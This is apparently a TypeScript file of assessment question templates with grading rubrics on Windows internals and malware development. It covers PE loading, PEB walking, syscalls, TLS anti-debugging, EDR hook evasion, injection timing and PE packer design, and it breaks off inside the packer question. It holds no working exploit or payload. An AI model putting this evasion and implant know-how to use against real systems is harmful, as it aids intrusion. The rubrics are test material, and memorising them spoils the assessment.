// Question templates: Windows internals & maldev
// Competencies: win-internals, maldev-techniques, evasion, reverse-engineering
// 15 templates per competency, 60 total

import type { QuestionTemplate } from "../types";

export const WIN_MALDEV_TEMPLATES: QuestionTemplate[] = [

// --- win-internals (Windows internals) ---

{
  competencyId: "win-internals",
  subTopic: "pe-sections",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `A PE file has the following section headers:

\`\`\`
.text   VirtualSize=0x1A00  VirtualAddress=0x1000  SizeOfRawData=0x1C00  PointerToRawData=0x400
.rdata  VirtualSize=0x800   VirtualAddress=0x3000  SizeOfRawData=0x800   PointerToRawData=0x2000
.data   VirtualSize=0x2000  VirtualAddress=0x4000  SizeOfRawData=0x200   PointerToRawData=0x2800
\`\`\`

The file's OptionalHeader.SectionAlignment is 0x1000 and FileAlignment is 0x200.

1. What is the in-memory size occupied by the .text section (including alignment padding)?
2. Why is .data's VirtualSize (0x2000) so much larger than its SizeOfRawData (0x200)?
3. If you wanted to find the raw file offset of an RVA 0x3040, which section contains it and what is the file offset?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "text-aligned-size", description: "Correctly states .text occupies 0x2000 bytes in memory (VirtualSize 0x1A00 rounded up to section alignment 0x1000)", points: 2, keywords: ["0x2000", "section alignment", "round up", "page"], check: "Student calculates that 0x1A00 rounds up to 0x2000 at 0x1000 alignment" },
      { id: "data-bss", description: "Explains that .data has uninitialized (BSS-like) data that occupies memory but has no raw file backing", points: 2, keywords: ["uninitialized", "BSS", "zeroed", "global variables", "static"], check: "Student identifies uninitialized globals/statics as reason for VirtualSize > SizeOfRawData" },
      { id: "rva-to-raw", description: "Correctly converts RVA 0x3040: in .rdata section, file offset = 0x3040 - 0x3000 + 0x2000 = 0x2040", points: 2, keywords: ["0x2040", ".rdata", "offset", "PointerToRawData"], check: "Student shows correct RVA-to-file-offset arithmetic landing on 0x2040" },
    ],
    gaps: [
      { if_missing: "text-aligned-size", gap: "PE section alignment and padding rules" },
      { if_missing: "data-bss", gap: "Difference between raw data and virtual data in PE sections (BSS concept)" },
      { if_missing: "rva-to-raw", gap: "RVA-to-file-offset conversion formula" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "pe-imports",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `A developer wrote a custom PE loader that resolves imports. Here is the import resolution logic:

\`\`\`c
// Walk the Import Directory Table
PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)
    (baseAddr + importDir->VirtualAddress);

while (importDesc->Name) {
    char* dllName = (char*)(baseAddr + importDesc->Name);
    HMODULE hDll = LoadLibraryA(dllName);

    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)
        (baseAddr + importDesc->OriginalFirstThunk);
    PIMAGE_THUNK_DATA iat = (PIMAGE_THUNK_DATA)
        (baseAddr + importDesc->FirstThunk);

    while (thunk->u1.AddressOfData) {
        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)
            (baseAddr + thunk->u1.AddressOfData);
        iat->u1.Function = (ULONG_PTR)GetProcAddress(hDll, importByName->Name);
        thunk++;
        iat++;
    }
    importDesc++;
}
\`\`\`

Identify at least two bugs or missing checks in this import resolver that would cause it to crash or behave incorrectly on real-world PE files.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "ordinal-check", description: "Identifies that imports by ordinal (IMAGE_SNAP_BY_ORDINAL) are not handled; the high bit check is missing", points: 3, keywords: ["ordinal", "IMAGE_SNAP_BY_ORDINAL", "high bit", "IMAGE_ORDINAL_FLAG"], check: "Student mentions that ordinal imports will be misinterpreted as RVAs, causing a crash" },
      { id: "null-module", description: "Notes that LoadLibraryA return value is not checked for NULL before passing to GetProcAddress", points: 2, keywords: ["NULL", "LoadLibrary", "check", "error", "handle"], check: "Student identifies missing NULL check on LoadLibraryA result" },
      { id: "bound-imports", description: "Mentions that bound imports or forwarded exports are not handled, or that OriginalFirstThunk can be zero requiring fallback to FirstThunk", points: 2, keywords: ["bound", "forwarded", "OriginalFirstThunk", "zero", "fallback"], check: "Student identifies at least one edge case: bound imports, forwarded exports, or zero OriginalFirstThunk" },
      { id: "getprocaddress-null", description: "Notes that GetProcAddress return is not checked; a missing export would write NULL to the IAT", points: 1, keywords: ["GetProcAddress", "NULL", "missing export"], check: "Student notes missing error check on GetProcAddress result" },
    ],
    gaps: [
      { if_missing: "ordinal-check", gap: "PE import resolution: ordinal vs name imports and IMAGE_SNAP_BY_ORDINAL" },
      { if_missing: "null-module", gap: "Defensive error handling in PE loading" },
      { if_missing: "bound-imports", gap: "PE import edge cases: bound imports, forwarded exports, OriginalFirstThunk fallback" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "peb-walking",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Trace through the following x64 assembly that resolves kernel32.dll's base address without calling any API:

\`\`\`asm
mov  rax, gs:[0x60]          ; (1)
mov  rax, [rax + 0x18]       ; (2)
mov  rsi, [rax + 0x20]       ; (3)
lodsq                         ; (4)
xchg rax, rsi
lodsq                         ; (5)
mov  rbx, [rax + 0x20]       ; (6)
\`\`\`

For each numbered instruction, explain:
- What structure or field is being accessed
- What value ends up in the destination register
- Why kernel32.dll ends up in rbx at the end (and not ntdll.dll or the executable itself)`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "gs60-peb", description: "Explains gs:[0x60] accesses the PEB (Process Environment Block) on x64", points: 2, keywords: ["PEB", "Process Environment Block", "gs", "TEB", "0x60"], check: "Student correctly identifies gs:[0x60] as the PEB pointer (via TEB)" },
      { id: "ldr-data", description: "Identifies offset 0x18 from PEB as PEB_LDR_DATA and 0x20 from that as InMemoryOrderModuleList", points: 2, keywords: ["PEB_LDR_DATA", "Ldr", "InMemoryOrderModuleList", "0x18", "0x20"], check: "Student names PEB_LDR_DATA and the InMemoryOrderModuleList linked list" },
      { id: "list-traversal", description: "Explains the lodsq/xchg pattern walks the doubly-linked LIST_ENTRY: first entry is the executable, second is ntdll, third is kernel32", points: 2, keywords: ["LIST_ENTRY", "Flink", "linked list", "first", "ntdll", "kernel32", "third"], check: "Student explains the linked list walk order and why two lodsq calls skip past exe and ntdll" },
      { id: "dllbase-offset", description: "Identifies that offset 0x20 from the LDR_DATA_TABLE_ENTRY retrieves the DllBase field", points: 2, keywords: ["DllBase", "base address", "0x20", "LDR_DATA_TABLE_ENTRY", "InMemoryOrderLinks"], check: "Student identifies the final dereference as reading the DllBase from the LDR entry" },
    ],
    gaps: [
      { if_missing: "gs60-peb", gap: "TEB/PEB access via segment registers on x64 Windows" },
      { if_missing: "ldr-data", gap: "PEB_LDR_DATA structure and module lists" },
      { if_missing: "list-traversal", gap: "InMemoryOrderModuleList traversal and default module load order" },
      { if_missing: "dllbase-offset", gap: "LDR_DATA_TABLE_ENTRY layout and DllBase field offset" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "virtual-memory",
  questionType: "predict_output",
  difficulty: 2,
  questionText: `What will this program print? Explain each VirtualQuery result.

\`\`\`c
#include <windows.h>
#include <stdio.h>

int main() {
    LPVOID p1 = VirtualAlloc(NULL, 0x10000, MEM_RESERVE, PAGE_READWRITE);
    LPVOID p2 = VirtualAlloc(p1, 0x1000, MEM_COMMIT, PAGE_READWRITE);
    LPVOID p3 = VirtualAlloc((BYTE*)p1 + 0x3000, 0x2000, MEM_COMMIT, PAGE_EXECUTE_READ);

    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(p1, &mbi, sizeof(mbi));
    printf("Region 1: State=%lx Protect=%lx RegionSize=%lx\\n",
           mbi.State, mbi.Protect, mbi.RegionSize);

    VirtualQuery((BYTE*)p1 + 0x1000, &mbi, sizeof(mbi));
    printf("Region 2: State=%lx Protect=%lx RegionSize=%lx\\n",
           mbi.State, mbi.Protect, mbi.RegionSize);

    VirtualQuery((BYTE*)p1 + 0x3000, &mbi, sizeof(mbi));
    printf("Region 3: State=%lx Protect=%lx RegionSize=%lx\\n",
           mbi.State, mbi.Protect, mbi.RegionSize);

    return 0;
}
\`\`\``,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "region1-committed", description: "Region 1 is MEM_COMMIT (0x1000) with PAGE_READWRITE (0x04) and size 0x1000", points: 2, keywords: ["MEM_COMMIT", "0x1000", "PAGE_READWRITE", "committed"], check: "Student identifies the first page as committed RW with size 0x1000" },
      { id: "region2-reserved", description: "Region 2 at p1+0x1000 is MEM_RESERVE (0x2000) because pages 0x1000-0x2FFF are reserved but not committed", points: 2, keywords: ["MEM_RESERVE", "0x2000", "reserved", "not committed", "gap"], check: "Student identifies the gap of reserved-only pages between the two committed regions" },
      { id: "region3-xr", description: "Region 3 at p1+0x3000 is MEM_COMMIT with PAGE_EXECUTE_READ (0x20) and size 0x2000", points: 2, keywords: ["PAGE_EXECUTE_READ", "0x20", "0x2000", "MEM_COMMIT"], check: "Student correctly identifies the XR committed region and its size" },
      { id: "reserve-commit", description: "Explains the reserve-then-commit pattern and why different protections create separate regions in VirtualQuery", points: 1, keywords: ["reserve", "commit", "region", "protection", "split", "allocation granularity"], check: "Student demonstrates understanding of how VirtualQuery splits regions by state and protection" },
    ],
    gaps: [
      { if_missing: "region1-committed", gap: "VirtualAlloc MEM_COMMIT behavior and VirtualQuery state reporting" },
      { if_missing: "region2-reserved", gap: "Understanding reserved vs committed virtual memory pages" },
      { if_missing: "region3-xr", gap: "Memory protection constants and how different protections split VirtualQuery regions" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "process-creation",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `When you call CreateProcessW on Windows, the kernel performs a long sequence of operations before the new process's main thread starts executing user-mode code.

Describe the major steps that occur between the CreateProcessW call and the first instruction of the target's main() function. Your answer should cover:
1. What happens in kernel mode (NtCreateUserProcess or its components)
2. What the initial thread does before reaching the entry point
3. The role of ntdll!LdrInitializeThunk and the loader

Focus on the steps most relevant to someone writing a process-hollowing or early-bird injection tool.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "kernel-steps", description: "Describes kernel creating address space, mapping ntdll, creating section object from the executable, setting up EPROCESS/ETHREAD", points: 2, keywords: ["address space", "section object", "EPROCESS", "ETHREAD", "ntdll", "map", "NtCreateUserProcess"], check: "Student covers kernel-side process creation: address space, section mapping, process/thread kernel structures" },
      { id: "initial-thread", description: "Explains the initial thread starts at ntdll!RtlUserThreadStart or LdrInitializeThunk, not at the entry point", points: 2, keywords: ["RtlUserThreadStart", "LdrInitializeThunk", "initial thread", "not entry point", "ntdll"], check: "Student identifies that the initial thread enters user mode through ntdll, not the PE entry point" },
      { id: "loader-work", description: "Describes LDR loading: walking imports, loading dependent DLLs, resolving IAT, calling DllMain for each, TLS callbacks", points: 2, keywords: ["imports", "IAT", "DllMain", "DLL_PROCESS_ATTACH", "TLS", "loader", "dependent"], check: "Student explains import resolution, DLL loading, DllMain calls, and/or TLS callback execution" },
      { id: "injection-relevance", description: "Connects to injection: process starts suspended (CREATE_SUSPENDED), hollowing replaces the image before the loader runs, early-bird queues APC before LdrInitializeThunk", points: 2, keywords: ["suspended", "CREATE_SUSPENDED", "hollowing", "early-bird", "APC", "before loader", "before LDR"], check: "Student connects process creation stages to injection timing windows" },
    ],
    gaps: [
      { if_missing: "kernel-steps", gap: "Kernel-mode process creation internals (NtCreateUserProcess)" },
      { if_missing: "initial-thread", gap: "Initial thread startup path through ntdll" },
      { if_missing: "loader-work", gap: "Windows PE loader initialization sequence" },
      { if_missing: "injection-relevance", gap: "Process creation stages relevant to injection techniques" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "win32-vs-nt-api",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `Compare and contrast using the documented Win32 API (kernel32/advapi32) versus the NT API (ntdll) for the following operations. For each, give the Win32 function, the underlying NT function, and explain when/why a red team tool would prefer the NT API:

1. Opening a process
2. Allocating virtual memory in a remote process
3. Creating a remote thread

Also explain: what is the security trade-off of calling NT functions directly? Under what circumstances does it actually help evade detection, and when does it not?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "api-pairs", description: "Correctly maps: OpenProcess/NtOpenProcess, VirtualAllocEx/NtAllocateVirtualMemory, CreateRemoteThread/NtCreateThreadEx", points: 2, keywords: ["NtOpenProcess", "NtAllocateVirtualMemory", "NtCreateThreadEx", "OpenProcess", "VirtualAllocEx", "CreateRemoteThread"], check: "Student provides at least 2 of the 3 correct Win32-to-NT API pairs" },
      { id: "bypass-hooks", description: "Explains that EDR/AV hooks are placed on Win32 API wrappers in ntdll; calling NT API directly can bypass inline hooks at the kernel32 layer", points: 2, keywords: ["hook", "inline hook", "bypass", "EDR", "kernel32", "trampoline", "detour"], check: "Student explains that Win32 wrappers in kernel32 are commonly hooked by EDR and NT calls can bypass that layer" },
      { id: "limitations", description: "Acknowledges that ntdll functions are also hooked by modern EDRs, and that kernel callbacks (ObRegisterCallbacks, ETW) catch both paths", points: 2, keywords: ["ntdll hooks", "kernel callbacks", "ObRegisterCallbacks", "ETW", "syscall", "both hooked"], check: "Student recognizes that ntdll is also hooked and kernel-level telemetry catches both" },
      { id: "trade-offs", description: "Discusses trade-offs: undocumented API instability across Windows versions, detection via import table analysis, and OPSEC considerations", points: 2, keywords: ["undocumented", "unstable", "version", "import table", "OPSEC", "syscall number", "detection"], check: "Student discusses practical trade-offs of using NT API: stability, detection artifacts, version dependency" },
    ],
    gaps: [
      { if_missing: "api-pairs", gap: "Win32-to-NT API mapping for core process manipulation functions" },
      { if_missing: "bypass-hooks", gap: "How EDR hooking works at the Win32 API layer" },
      { if_missing: "limitations", gap: "Limitations of NT API usage for evasion (ntdll hooks, kernel callbacks)" },
      { if_missing: "trade-offs", gap: "OPSEC and stability trade-offs of using undocumented NT APIs" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "handle-table",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `A process opens the following handles in sequence:

\`\`\`c
HANDLE hFile    = CreateFileA("C:\\\\test.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMutex   = CreateMutexA(NULL, FALSE, "MyMutex");
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
CloseHandle(hFile);
HANDLE hThread  = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
\`\`\`

1. What handle values would you typically expect for hFile, hMutex, hProcess, and hThread? (Not the exact values, but the pattern.)
2. After CloseHandle(hFile), is that handle value immediately reusable? What happens if another thread calls CreateFile before CreateThread?
3. Why would a malware analyst care about the handle table when investigating a suspicious process?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "handle-pattern", description: "Explains handles are multiples of 4, starting from 4 (0 is invalid), monotonically increasing unless reused", points: 2, keywords: ["multiple of 4", "0x4", "sequential", "monotonic", "reused", "increment"], check: "Student describes the handle value pattern (multiples of 4, sequential allocation)" },
      { id: "handle-reuse", description: "Explains that closed handle slots can be reused; the next handle allocation may recycle the old value", points: 2, keywords: ["reuse", "recycle", "free", "slot", "next allocation", "closed"], check: "Student explains handle value reuse after CloseHandle" },
      { id: "forensic-value", description: "Explains why analysts inspect handle tables: reveals open file/registry/process handles, indicates injection targets, shows mutex names used for single-instance checks", points: 3, keywords: ["forensic", "analyst", "injection", "target process", "mutex", "open handles", "suspicious", "Process Hacker", "handle leak"], check: "Student explains investigative value of handle table analysis for malware investigation" },
    ],
    gaps: [
      { if_missing: "handle-pattern", gap: "Windows kernel handle table structure and handle value semantics" },
      { if_missing: "handle-reuse", gap: "Handle lifecycle and reuse behavior" },
      { if_missing: "forensic-value", gap: "Forensic significance of process handle tables" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "tls-callbacks",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `A developer wants to use TLS callbacks for anti-debugging. Their code compiles but the callback never fires:

\`\`\`c
#include <windows.h>
#include <stdio.h>

void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        if (IsDebuggerPresent()) {
            ExitProcess(1);
        }
    }
}

// Register the TLS callback
#pragma data_seg(".CRT$XLB")
PIMAGE_TLS_CALLBACK pTlsCallback = TlsCallback;
#pragma data_seg()

int main() {
    printf("Running normally\\n");
    return 0;
}
\`\`\`

Compiled with: \`cl.exe /nologo program.c\`

1. Why doesn't the TLS callback fire?
2. Fix the code so it works with MSVC.
3. Is this anti-debug technique effective? What are its weaknesses?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "missing-comment-pragma", description: "Identifies the missing #pragma comment(linker, \"/INCLUDE:_tls_used\") or __pragma that forces the linker to include the TLS directory", points: 3, keywords: ["_tls_used", "linker", "/INCLUDE", "TLS directory", "pragma comment", "stripped", "optimized out"], check: "Student identifies that the linker strips the TLS directory without forcing inclusion of _tls_used symbol" },
      { id: "correct-fix", description: "Provides the correct fix: adding the linker pragma and optionally the __declspec(allocate) approach", points: 2, keywords: ["#pragma comment", "linker", "_tls_used", "__declspec(allocate)", "PIMAGE_TLS_CALLBACK"], check: "Student provides working code fix that forces TLS callback registration" },
      { id: "weakness-analysis", description: "Discusses weaknesses: easy to detect in static analysis (TLS directory in PE header), debuggers can skip callbacks, analysts check AddressOfCallBacks", points: 3, keywords: ["static analysis", "TLS directory", "AddressOfCallBacks", "debugger skip", "x64dbg", "detectable", "PE header"], check: "Student identifies at least 2 weaknesses of TLS callback anti-debugging" },
    ],
    gaps: [
      { if_missing: "missing-comment-pragma", gap: "TLS callback registration mechanics in MSVC (linker symbol inclusion)" },
      { if_missing: "correct-fix", gap: "Practical TLS callback implementation in C/C++" },
      { if_missing: "weakness-analysis", gap: "Limitations and detectability of TLS callback anti-debugging" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "dll-loading",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You need to write a minimal manual DLL mapper that loads a DLL into the current process without calling LoadLibrary. The DLL uses the CRT, imports from kernel32.dll and user32.dll, and has relocations.

Describe the steps your mapper must perform, in order, to correctly load and execute the DLL's DllMain. For each step, name the PE structures you parse and the Windows APIs you call (if any). Explain what would break if you skipped each step.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "alloc-and-copy", description: "Allocate memory with VirtualAlloc at preferred base (or any base), copy headers and sections respecting VirtualAddress/SizeOfRawData", points: 2, keywords: ["VirtualAlloc", "SectionAlignment", "copy headers", "copy sections", "VirtualAddress", "SizeOfRawData"], check: "Student describes allocating memory and copying PE headers + sections with correct alignment" },
      { id: "relocations", description: "Process base relocations if loaded at non-preferred address: parse IMAGE_BASE_RELOCATION, apply delta to each entry", points: 2, keywords: ["relocation", "IMAGE_BASE_RELOCATION", "delta", "preferred base", "ImageBase", "fixup"], check: "Student explains relocation processing with delta calculation" },
      { id: "imports", description: "Walk IMAGE_IMPORT_DESCRIPTOR, load each dependency DLL, resolve each import (by name or ordinal), write addresses to IAT", points: 2, keywords: ["IMAGE_IMPORT_DESCRIPTOR", "IAT", "FirstThunk", "GetProcAddress", "ordinal", "resolve"], check: "Student describes import resolution including IAT patching" },
      { id: "protections", description: "Set correct memory protections per section using VirtualProtect based on section Characteristics flags", points: 2, keywords: ["VirtualProtect", "Characteristics", "PAGE_EXECUTE_READ", "PAGE_READWRITE", "section flags", "protection"], check: "Student mentions setting per-section memory protections" },
      { id: "entry-point", description: "Call DllMain (AddressOfEntryPoint + base) with DLL_PROCESS_ATTACH, handle TLS callbacks if present", points: 2, keywords: ["DllMain", "AddressOfEntryPoint", "DLL_PROCESS_ATTACH", "TLS", "entry point"], check: "Student describes calling the entry point and optionally TLS callbacks" },
    ],
    gaps: [
      { if_missing: "alloc-and-copy", gap: "PE manual mapping: memory allocation and section copying" },
      { if_missing: "relocations", gap: "PE base relocation processing" },
      { if_missing: "imports", gap: "Manual IAT resolution during PE loading" },
      { if_missing: "protections", gap: "Section-level memory protection application" },
      { if_missing: "entry-point", gap: "DLL entry point invocation and TLS callback handling" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "wow64",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText: `Compare the execution environment of a 32-bit process running under WoW64 on 64-bit Windows versus a native 64-bit process. Address:

1. How system calls transition from user mode to kernel mode in each case
2. The role of wow64.dll, wow64cpu.dll, and wow64win.dll
3. How the file system and registry are virtualized
4. Implications for a red team operator: which architecture should an implant target, and why might a 32-bit implant on a 64-bit OS be both advantageous and disadvantageous?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "syscall-transition", description: "Explains WoW64 syscall path: 32-bit code calls ntdll32 which transitions through wow64cpu.dll's far jump to 64-bit mode (heaven's gate) before invoking the 64-bit ntdll syscall stub", points: 2, keywords: ["heaven's gate", "far jump", "wow64cpu", "ntdll32", "ntdll64", "transition", "segment selector", "0x33"], check: "Student describes the WoW64 syscall transition mechanism including the 32-to-64-bit mode switch" },
      { id: "wow64-dlls", description: "Describes role of each: wow64.dll (core translation), wow64cpu.dll (CPU context switching), wow64win.dll (win32k thunking for GUI calls)", points: 2, keywords: ["wow64.dll", "wow64cpu.dll", "wow64win.dll", "thunk", "translation", "context", "win32k"], check: "Student explains the role of at least 2 of the 3 WoW64 DLLs" },
      { id: "fs-registry-redirect", description: "Explains SysWOW64/System32 redirection, Wow6432Node in registry, and Sysnative access", points: 2, keywords: ["SysWOW64", "System32", "Wow6432Node", "file system redirector", "Sysnative", "registry reflection"], check: "Student describes filesystem and/or registry virtualization for WoW64 processes" },
      { id: "redteam-implications", description: "Discusses trade-offs: 32-bit may evade some 64-bit-focused EDR hooks, but loses access to full address space, heaven's gate detection, and some EDRs specifically flag WoW64 syscall transitions", points: 2, keywords: ["EDR", "detection", "address space", "evasion", "hook", "32-bit implant", "disadvantage", "advantage"], check: "Student discusses at least one advantage and one disadvantage of 32-bit implants on 64-bit OS" },
    ],
    gaps: [
      { if_missing: "syscall-transition", gap: "WoW64 syscall translation mechanism (heaven's gate)" },
      { if_missing: "wow64-dlls", gap: "WoW64 subsystem DLL architecture" },
      { if_missing: "fs-registry-redirect", gap: "WoW64 filesystem and registry redirection" },
      { if_missing: "redteam-implications", gap: "Offensive implications of process architecture choice" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "ntdll-syscalls",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Here is the disassembly of NtAllocateVirtualMemory from ntdll.dll on a Windows 10 21H2 system:

\`\`\`asm
ntdll!NtAllocateVirtualMemory:
  4c 8b d1             mov r10, rcx
  b8 18 00 00 00       mov eax, 0x18
  f6 04 25 08 03 fe 7f 01  test byte ptr [0x7FFE0308], 1
  75 03                jne short +3
  0f 05                syscall
  c3                   ret
  cd 2e                int 2Eh
  c3                   ret
\`\`\`

1. Walk through each instruction and explain its purpose.
2. What is at address 0x7FFE0308 and why is it checked?
3. Why does the function have two different paths to enter kernel mode?
4. What is the significance of the value 0x18 in eax?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "r10-rcx", description: "Explains mov r10,rcx saves the first argument because syscall clobbers rcx (it stores RIP for sysret)", points: 2, keywords: ["r10", "rcx", "clobber", "syscall", "sysret", "RIP", "first argument"], check: "Student explains why rcx is saved to r10 before syscall" },
      { id: "ssn", description: "Identifies 0x18 as the System Service Number (SSN) / syscall number for NtAllocateVirtualMemory", points: 2, keywords: ["SSN", "syscall number", "system service number", "0x18", "SSDT", "service table"], check: "Student identifies 0x18 as the syscall number" },
      { id: "shareddata", description: "Explains 0x7FFE0308 is in KUSER_SHARED_DATA (SharedUserData), the bit determines whether to use syscall or int 2Eh (legacy path)", points: 2, keywords: ["KUSER_SHARED_DATA", "SharedUserData", "0x7FFE0000", "legacy", "syscall", "int 2Eh", "compatibility"], check: "Student identifies KUSER_SHARED_DATA and explains the syscall vs int 2Eh branching" },
      { id: "two-paths", description: "Explains syscall is the fast path for modern CPUs, int 2Eh is the legacy/compatibility path, and when each is used", points: 2, keywords: ["fast path", "legacy", "compatibility", "older CPU", "Hyper-V", "int 2Eh", "syscall instruction"], check: "Student explains the two kernel entry mechanisms and their use cases" },
    ],
    gaps: [
      { if_missing: "r10-rcx", gap: "x64 syscall calling convention and register clobbering" },
      { if_missing: "ssn", gap: "System Service Numbers and the SSDT" },
      { if_missing: "shareddata", gap: "KUSER_SHARED_DATA structure and its role in syscall dispatch" },
      { if_missing: "two-paths", gap: "Kernel entry mechanisms: syscall vs int 2Eh" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "pe-relocations",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This relocation processing code has a bug that causes crashes on x64 PE files but works fine for x86:

\`\`\`c
void ApplyRelocations(PBYTE pBase, PIMAGE_NT_HEADERS pNtHdr) {
    ULONG_PTR delta = (ULONG_PTR)pBase - pNtHdr->OptionalHeader.ImageBase;
    if (delta == 0) return;

    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pBase +
        pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocSize = pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    while (pReloc->VirtualAddress && pReloc->SizeOfBlock) {
        DWORD entryCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD pEntry = (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < entryCount; i++) {
            WORD type = pEntry[i] >> 12;
            WORD offset = pEntry[i] & 0x0FFF;

            if (type == IMAGE_REL_BASED_HIGHLOW) {
                PDWORD patchAddr = (PDWORD)(pBase + pReloc->VirtualAddress + offset);
                *patchAddr += (DWORD)delta;
            }
        }
        pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
    }
}
\`\`\`

1. What is the bug?
2. Fix it.
3. What other relocation type should be handled for completeness?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "dir64-missing", description: "Identifies that IMAGE_REL_BASED_DIR64 (type 10) is not handled; x64 PEs use 64-bit relocations, not HIGHLOW", points: 3, keywords: ["IMAGE_REL_BASED_DIR64", "type 10", "64-bit", "HIGHLOW", "x64", "8 bytes"], check: "Student identifies the missing IMAGE_REL_BASED_DIR64 relocation type for x64 binaries" },
      { id: "fix-code", description: "Adds a case for IMAGE_REL_BASED_DIR64 that patches a PULONGLONG with the full 64-bit delta", points: 2, keywords: ["PULONGLONG", "ULONG_PTR", "DIR64", "64-bit patch", "8 byte"], check: "Student provides correct fix adding DIR64 handling with 64-bit pointer arithmetic" },
      { id: "other-types", description: "Mentions IMAGE_REL_BASED_ABSOLUTE (type 0) as padding/skip, or other types like HIGH/LOW for completeness", points: 2, keywords: ["IMAGE_REL_BASED_ABSOLUTE", "type 0", "padding", "skip", "HIGH", "LOW"], check: "Student mentions at least one other relocation type (especially ABSOLUTE as no-op)" },
    ],
    gaps: [
      { if_missing: "dir64-missing", gap: "PE relocation types for x64 (IMAGE_REL_BASED_DIR64)" },
      { if_missing: "fix-code", gap: "Implementing 64-bit relocation patching" },
      { if_missing: "other-types", gap: "Complete PE relocation type coverage" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "thread-context",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `This code attempts to read the instruction pointer of a remote thread for debugging purposes:

\`\`\`c
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;

HANDLE hThread = OpenThread(THREAD_GET_CONTEXT, FALSE, threadId);
if (hThread) {
    if (GetThreadContext(hThread, &ctx)) {
        printf("RIP = 0x%llx\\n", ctx.Rip);
    }
    CloseHandle(hThread);
}
\`\`\`

This code sometimes prints garbage values for RIP. Identify the problem and explain under what conditions it fails.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "suspend-required", description: "Identifies that GetThreadContext requires the thread to be suspended first; reading context of a running thread produces undefined results", points: 3, keywords: ["SuspendThread", "suspended", "running", "undefined", "race condition", "must suspend"], check: "Student identifies that the thread must be suspended before GetThreadContext works reliably" },
      { id: "context-init", description: "Notes that the CONTEXT structure should be zero-initialized or properly sized; uninitialized fields may contain garbage", points: 2, keywords: ["zero", "initialize", "memset", "ZeroMemory", "uninitialized", "stack garbage"], check: "Student mentions that the CONTEXT struct should be zeroed before use" },
      { id: "resume", description: "Mentions the need to ResumeThread after reading context to avoid leaving the thread suspended", points: 1, keywords: ["ResumeThread", "resume", "deadlock", "hang"], check: "Student mentions resuming the thread after context read" },
    ],
    gaps: [
      { if_missing: "suspend-required", gap: "GetThreadContext requirement for thread suspension" },
      { if_missing: "context-init", gap: "Proper CONTEXT structure initialization" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "pe-headers",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `You are tasked with building a PE packer for an offensive tool. The packer should:
- Take an arbitrary PE executable as input
- Produce a new PE that, when run, unpacks and executes the original PE in memory

Design the packer's architecture. Describe:
1. How you would store the original PE inside the packed executable
2. The unpacking stub's logic (step by step)
3. How you handle the original PE's imports, relocations, and TLS callbacks
4. What the packed PE's own section layout and headers look like
5. At least two anti-analysis features you would add to the stub`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "payload-storage", description: "Describes embedding the original PE as an encrypted/compressed blob in a section or resource of the stub PE", points: 2, keywords: ["encrypted", "compressed", "resource", "section", "blob", "embedded", "XOR", "RC4", "AES", ".rsrc"], check: "Student describes a method for storing the original PE inside the packed executable" },
